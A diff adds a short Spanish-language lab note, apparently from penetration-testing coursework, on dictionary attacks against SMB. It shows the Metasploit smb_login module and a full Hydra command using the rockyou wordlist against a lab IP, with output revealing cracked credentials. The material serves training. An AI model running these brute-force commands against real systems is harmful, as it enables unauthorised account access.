@@ -1,0 +1,21 @@
+# SMB Dictionary attack
+
+Para fuerza bruta podemos utilizar metasploit.
+
+    . use auxiliary/scanner/smb/smb_login
+    Seteamos todas las opciones necesarias para lanzar el escaneo
+    En el video utilizan como login "jane", que era uno de los usuarios que se habian listado en otros laboratorios
+
+    ejecutamos y nos da exito con la contraseña: abc123
+
+Ahora probamos con Hydra
+    
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.100.17.3 smb
+    Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-08 08:39:44
+    [INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+    [DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
+    [DATA] attacking smb://192.100.17.3:445/
+    [445][smb] host: 192.100.17.3   login: **admin**   password: **password1**
+    1 of 1 target successfully completed, 1 valid password found
